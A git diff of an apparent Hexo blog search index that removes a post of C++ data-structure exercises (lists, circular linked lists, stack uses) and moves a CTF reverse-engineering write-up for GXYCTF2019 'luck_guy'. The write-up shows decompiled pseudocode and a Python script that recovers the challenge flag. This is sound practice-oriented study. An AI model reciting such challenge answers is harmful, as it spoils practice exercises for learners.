-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ElemType int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SqList</span></span><br><span class="line">&#123;</span><br><span class="line">	ElemType* ptr;  <span class="comment">//数组指针</span></span><br><span class="line">	<span class="type">int</span> length;     <span class="comment">//元素个数</span></span><br><span class="line">	<span class="type">int</span> capacity;   <span class="comment">//数组容量</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InitSqList</span><span class="params">(SqList*&amp; L, <span class="type">int</span> capacity)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (capacity &lt;= <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	L = (SqList*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(SqList));</span><br><span class="line">	<span class="keyword">if</span> (!L)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	L-&gt;ptr = (ElemType*)<span class="built_in">malloc</span>(capacity * <span class="built_in">sizeof</span>(ElemType));</span><br><span class="line">	<span class="keyword">if</span> (!L-&gt;ptr)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	L-&gt;length = <span class="number">0</span>;</span><br><span class="line">	L-&gt;capacity = capacity;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InsertSqList</span><span class="params">(SqList* L, <span class="type">int</span> index, ElemType data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt; L-&gt;length || L-&gt;length == L-&gt;capacity)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;	<span class="comment">//插入失败: 索引错误或容量已满</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (index == L-&gt;length)	<span class="comment">//插入到线性表最后一个元素的后一个</span></span><br><span class="line">		L-&gt;ptr[index] = data;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = L-&gt;length - <span class="number">1</span>; i &gt;= index; i--)</span><br><span class="line">			<span class="comment">//元素从后往前依次向后移动1次, 从后往前避免覆盖</span></span><br><span class="line">		&#123;</span><br><span class="line">			L-&gt;ptr[i + <span class="number">1</span>] = L-&gt;ptr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		L-&gt;ptr[index] = data;</span><br><span class="line">	&#125;</span><br><span class="line">	L-&gt;length++;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DisplaySqList</span><span class="params">(SqList* L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (L-&gt;length == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[Blank SqList]\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; L-&gt;length; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, L-&gt;ptr[i]);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SqList* s = <span class="literal">nullptr</span>;</span><br><span class="line">	<span class="built_in">InitSqList</span>(s, <span class="number">100</span>);</span><br><span class="line">	<span class="built_in">DisplaySqList</span>(s);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">DisplaySqList</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[Blank SqList]</span></span><br><span class="line"><span class="comment">0 1 2 3 4</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
-<h3 id="循环单链表插入尾指针表示-带头节点">循环单链表插入(尾指针表示,
-带头节点)</h3>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ElemType int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    ElemType data;</span><br><span class="line">    Node* next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InitLinkedList</span><span class="params">(Node*&amp; L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L = (Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">    <span class="keyword">if</span> (!L)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    L-&gt;next = L;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InsertLinkedList</span><span class="params">(Node*&amp; L, <span class="type">int</span> index, ElemType data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    Node* head = L-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">-1</span>;</span><br><span class="line">    Node* p = head;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == index - <span class="number">1</span>)     <span class="comment">//如果当前节点为要插入位置的前一个节点</span></span><br><span class="line">        &#123;</span><br><span class="line">            Node* newNode = (Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">            <span class="keyword">if</span> (!newNode)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            newNode-&gt;data = data;</span><br><span class="line">            newNode-&gt;next = p-&gt;next;</span><br><span class="line">            p-&gt;next = newNode;</span><br><span class="line">            <span class="keyword">if</span> (newNode-&gt;next == head)  <span class="comment">//如果新插入的节点是尾节点, 那么把尾指针指向新节点</span></span><br><span class="line">                L = newNode;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next, i++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (p != head);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">// 如果整个循环链表中都没有目标位置, 就返回错误代码-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DisplayLinkedList</span><span class="params">(Node* L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L == L-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[Blank LinkedList]\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Node* head = L-&gt;next;</span><br><span class="line">        <span class="keyword">for</span> (Node* p = head-&gt;next; p != head; p = p-&gt;next)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p-&gt;data);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* l = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="built_in">InitLinkedList</span>(l);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">5</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">DisplayLinkedList</span>(l);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0 1 2 3 4 5</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
-<h3 id="循环单链表合并尾指针表示-带头节点">循环单链表合并(尾指针表示,
-带头节点)</h3>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ElemType int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    ElemType data;</span><br><span class="line">    Node* next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InitLinkedList</span><span class="params">(Node*&amp; L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L = (Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">    <span class="keyword">if</span> (!L)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    L-&gt;next = L;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InsertLinkedList</span><span class="params">(Node*&amp; L, <span class="type">int</span> index, ElemType data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    Node* head = L-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">-1</span>;</span><br><span class="line">    Node* p = head;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == index - <span class="number">1</span>)     <span class="comment">//如果当前节点为要插入位置的前一个节点</span></span><br><span class="line">        &#123;</span><br><span class="line">            Node* newNode = (Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">            <span class="keyword">if</span> (!newNode)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            newNode-&gt;data = data;</span><br><span class="line">            newNode-&gt;next = p-&gt;next;</span><br><span class="line">            p-&gt;next = newNode;</span><br><span class="line">            <span class="keyword">if</span> (newNode-&gt;next == head)  <span class="comment">//如果新插入的节点是尾节点, 那么把尾指针指向新节点</span></span><br><span class="line">                L = newNode;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next, i++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (p != head);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">// 如果整个循环链表中都没有目标位置, 就返回错误代码-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergeLinkedList</span><span class="params">(Node*&amp; La, Node*&amp; Lb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//将b循环链表接到a循环链表的后面</span></span><br><span class="line">    Node* aHead = La-&gt;next;</span><br><span class="line">    Node* bHead = Lb-&gt;next;</span><br><span class="line"></span><br><span class="line">    La-&gt;next = bHead-&gt;next;</span><br><span class="line">    Lb-&gt;next = aHead;</span><br><span class="line">    <span class="built_in">free</span>(bHead);    <span class="comment">//释放b循环链表的头节点</span></span><br><span class="line">    La = Lb;</span><br><span class="line">    Lb = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DisplayLinkedList</span><span class="params">(Node* L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L == L-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[Blank LinkedList]\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Node* head = L-&gt;next;</span><br><span class="line">        <span class="keyword">for</span> (Node* p = head-&gt;next; p != head; p = p-&gt;next)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p-&gt;data);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* l1 = <span class="literal">nullptr</span>, *l2=<span class="literal">nullptr</span>;</span><br><span class="line">    <span class="built_in">InitLinkedList</span>(l1);</span><br><span class="line">    <span class="built_in">InitLinkedList</span>(l2);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">3</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">1</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">2</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">3</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">4</span>, <span class="number">9</span>);</span><br><span class="line">    <span class="built_in">DisplayLinkedList</span>(l1);</span><br><span class="line">    <span class="built_in">DisplayLinkedList</span>(l2);</span><br><span class="line">    <span class="built_in">MergeLinkedList</span>(l1, l2);</span><br><span class="line">    <span class="built_in">DisplayLinkedList</span>(l1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0 1 2 3 4</span></span><br><span class="line"><span class="comment">5 6 7 8 9</span></span><br><span class="line"><span class="comment">0 1 2 3 4 5 6 7 8 9</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
-<h3 id="栈的应用-括号匹配">栈的应用-括号匹配</h3>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">match</span><span class="params">(<span class="type">char</span> <span class="type">const</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::stack&lt;<span class="type">char</span>&gt; s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i]; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (str[i] == <span class="string">&#x27;(&#x27;</span> || str[i] == <span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">            s.<span class="built_in">push</span>(str[i]);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (str[i] == <span class="string">&#x27;)&#x27;</span> &amp;&amp; s.<span class="built_in">top</span>() == <span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">            s.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (str[i] == <span class="string">&#x27;]&#x27;</span> &amp;&amp; s.<span class="built_in">top</span>() == <span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">            s.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout.<span class="built_in">setf</span>(std::ios::boolalpha);</span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">match</span>(<span class="string">&quot;[[()[()]]]&quot;</span>) &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">match</span>(<span class="string">&quot;[[()[()]])&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">true</span></span><br><span class="line"><span class="comment">false</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
-<h3 id="栈的应用-进制转换">栈的应用-进制转换</h3>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//无符号数的进制转换</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BaseConvert</span><span class="params">(<span class="type">unsigned</span> base, <span class="type">unsigned</span> num, <span class="type">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::stack&lt;<span class="type">char</span>&gt; s;</span><br><span class="line">    <span class="keyword">for</span> (; num; num /= base)</span><br><span class="line">        s.<span class="built_in">push</span>(num % base + <span class="number">0x30</span>);	<span class="comment">//取余并转换为ASCII码</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;!s.<span class="built_in">empty</span>();s.<span class="built_in">pop</span>(), i++)</span><br><span class="line">        str[i] = s.<span class="built_in">top</span>();</span><br><span class="line">    str[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> num = <span class="number">0x12345678</span>;</span><br><span class="line">    <span class="built_in">BaseConvert</span>(<span class="number">2</span>, num, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2进制: %s\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">BaseConvert</span>(<span class="number">8</span>, num, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;8进制: %s\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">BaseConvert</span>(<span class="number">10</span>, num, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;10进制: %s\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">BaseConvert</span>(<span class="number">16</span>, num, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;16进制: %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">2进制: 10010001101000101011001111000</span></span><br><span class="line"><span class="comment">8进制: 2215053170</span></span><br><span class="line"><span class="comment">10进制: 305419896</span></span><br><span class="line"><span class="comment">16进制: 12345678</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Note</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-        <tag>数据结构</tag>
       </tags>
   </entry>
   <entry>
@@ -603,27 +603,6 @@ alt="image-20220126211735455" />
       </tags>
   </entry>
   <entry>
-    <title>[GXYCTF2019]luck_guy</title>
-    <url>/2022/01/22/%5BReverse%5DGXYCTF2019-luck-guy/</url>
-    <content><![CDATA[<p>不是PE文件, 进<code>IDA</code>分析, F5看伪代码.</p>
-<p><code>main()</code>里面有个<code>patch_me()</code>,
-在<code>patch_me()</code>里面找到<code>get_flag()</code>关键函数</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 s; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v0);                    <span class="comment">//时间作为随机数种子</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( rand() % <span class="number">200</span> )     <span class="comment">//随机数决定执行哪个case</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, f1);    <span class="comment">//f1=&quot;GXY&#123;do_not_&quot;</span></span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, &amp;f2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar not like you&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar want a girlfriend&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        s = <span class="number">0x7F666F6067756369</span>LL;</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;emmm,you can&#x27;t find flag 23333&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>关键就在<code>1,4,5</code>这三个<code>case</code>里,
-应该要以合适的顺序执行才能得到<strong>flag</strong></p>
-<p>分析出来正确的顺序应该是<code>4,5,1</code>, 写成Python代码如下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string0 = <span class="string">&quot;GXY&#123;do_not_&quot;</span></span><br><span class="line">string1 = <span class="string">&quot;\x69\x63\x75\x67\x60\x6f\x66\x7f&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(string1)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        string0 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(string1[i]) - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        string0 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(string1[i]) - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(string0)</span><br><span class="line"><span class="comment">#GXY&#123;do_not_hate_me&#125;</span></span><br></pre></td></tr></table></figure>
-<p>所以<strong>flag</strong>就是<code>GXY&#123;do_not_hate_me&#125;</code></p>
-]]></content>
-      <categories>
-        <category>Reverse</category>
-      </categories>
-      <tags>
-        <tag>二进制</tag>
-        <tag>逆向</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>[GWCTF 2019]pyre</title>
     <url>/2022/01/23/%5BReverse%5DGWCTF-2019-pyre/</url>
     <content><![CDATA[<p><code>Python</code>的逆向,
@@ -667,6 +646,27 @@ alt="image-20220123181846852" />
       </tags>
   </entry>
   <entry>
+    <title>[GXYCTF2019]luck_guy</title>
+    <url>/2022/01/22/%5BReverse%5DGXYCTF2019-luck-guy/</url>
+    <content><![CDATA[<p>不是PE文件, 进<code>IDA</code>分析, F5看伪代码.</p>
+<p><code>main()</code>里面有个<code>patch_me()</code>,
+在<code>patch_me()</code>里面找到<code>get_flag()</code>关键函数</p>
